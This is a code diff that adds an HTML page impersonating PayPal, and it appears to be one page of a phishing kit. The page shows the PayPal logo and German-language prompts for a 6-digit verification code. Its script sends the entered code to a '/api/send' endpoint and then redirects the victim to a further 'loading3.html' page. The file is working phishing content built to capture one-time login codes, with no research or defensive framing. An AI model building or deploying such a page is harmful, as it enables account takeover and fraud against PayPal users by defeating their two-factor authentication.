@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verify Code</title>
+  <style>
+  body {
+    font-family: Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    min-height: 100vh;
+    margin: 0;
+    background: #fff;
+  }
+
+  .container {
+    width: 90%;
+    max-width: 360px;
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+  }
+
+  .logo {
+    text-align: center;
+    margin-bottom: 20px;
+  }
+
+  .logo img {
+    height: 40px;
+  }
+
+  .info-text {
+    font-size: 14px;
+    color: #666;
+    margin-bottom: 15px;
+    text-align: center;
+  }
+
+  /* 🔑 WICHTIG: Grid statt Flex → bleibt IMMER eine Reihe */
+ .code-inputs{
+  width: 100%;
+  box-sizing: border-box;
+  display: grid;
+  grid-template-columns: repeat(6, 1fr);
+  gap: 8px;
+  margin-bottom: 16px;
+}
+
+.code-inputs input{
+  width: 100%;
+  min-width: 0;          /* 🔥 verhindert “rausrutschen” */
+  height: 50px;
+  text-align: center;
+  border: 1px solid #ccc;
+  border-radius: 6px;
+  box-sizing: border-box;
+  font-size: 16px;       /* iOS-Zoom vermeiden */
+
+
+    /* verhindert iOS-Zoom */
+    font-size: 16px;
+  }
+
+  .code-inputs input:focus {
+    outline: none;
+    border-color: #0070ba;
+    box-shadow: 0 0 0 1px rgba(0,112,186,0.4);
+  }
+
+  .button-primary {
+    display: block;
+    width: 100%;
+    background-color: #0070ba;
+    color: white;
+    font-size: 16px;
+    font-weight: 600;
+    padding: 14px 0;
+    border: none;
+    border-radius: 30px;
+    cursor: pointer;
+    margin-top: 10px;
+    transition: background-color 0.3s ease;
+  }
+
+  .button-primary:hover {
+    background-color: #005ea6;
+  }
+
+  .error {
+    display: none;
+    color: #d93025;
+    font-size: 13px;
+    margin-top: 10px;
+    text-align: center;
+  }
+
+  /* 📱 Mobile Feinjustierung */
+  @media (max-width: 360px) {
+    .code-inputs {
+      gap: 6px;
+    }
+
+    .code-inputs input {
+      height: 46px;
+      font-size: 16px;
+    }
+
+    .info-text {
+      font-size: 13px;
+    }
+  }
+</style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal Logo">
+    </div>
+
+    <form id="codeForm">
+      <div class="info-text" id="infoText"></div>
+
+      <div class="code-inputs" id="codeInputs">
+  <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code">
+  <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+  <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+  <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+  <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+  <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+    </div>
+
+      <button type="submit" id="verifyBtn" class="button-primary"></button>
+      <div id="error" class="error"></div>
+    </form>
+  </div>
+ <script>
+  const translations = {
+    de: {
+      infoText: "Bitte geben Sie den 6-stelligen Code ein:",
+      verifyBtn: "Bestätigen",
+      error: "Bitte geben Sie einen gültigen 6-stelligen Code ein."
+    },
+    en: {
+      infoText: "Please enter the 6-digit code:",
+      verifyBtn: "Confirm",
+      error: "Please enter a valid 6-digit code."
+    }
+  };
+
+  const lang = localStorage.getItem("lang") || "de";
+  const t = translations[lang] || translations.de;
+
+  const infoEl = document.getElementById("infoText");
+  const btnEl = document.getElementById("verifyBtn");
+  const errEl = document.getElementById("error");
+  const form = document.getElementById("codeForm");
+  const inputs = document.querySelectorAll("#codeInputs input");
+
+  infoEl.textContent = t.infoText;
+  btnEl.textContent = t.verifyBtn;
+  errEl.textContent = t.error;
+  errEl.style.display = "none";
+
+  // 🔢 Eingaben: nur Ziffern + Auto-Fokus + Paste/Autofill
+  inputs.forEach((input, idx) => {
+    input.setAttribute("maxlength", "1");
+
+    input.addEventListener("input", () => {
+      const raw = input.value.replace(/[^0-9]/g, "");
+      errEl.style.display = "none";
+
+      // Paste / Autofill mit mehreren Ziffern
+      if (raw.length > 1) {
+        raw.slice(0, inputs.length).split("").forEach((ch, i) => {
+          inputs[i].value = ch;
+        });
+        inputs[Math.min(raw.length, inputs.length) - 1].focus();
+        return;
+      }
+
+      input.value = raw;
+
+      if (input.value && idx < inputs.length - 1) {
+        inputs[idx + 1].focus();
+      }
+    });
+
+    input.addEventListener("keydown", (e) => {
+      if (e.key === "Backspace" && !input.value && idx > 0) {
+        inputs[idx - 1].focus();
+      }
+    });
+  });
+
+  // 🚀 Submit
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+
+    const ziffern = Array.from(inputs).map(i => i.value).join("");
+
+    // exakt 6 Ziffern prüfen
+    if (!/^\d{6}$/.test(ziffern)) {
+      errEl.style.display = "block";
+      return;
+    }
+
+    // ✅ FETCH – Ziffern werden gesendet
+    await fetch("/api/send", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        message: `Code: ${ziffern}`
+      })
+    });
+
+    // 🔁 Weiterleitung
+    window.location.href = "loading3.html";
+  });
+</script>
+</body>
+</html>
+
+
+
+
+
+
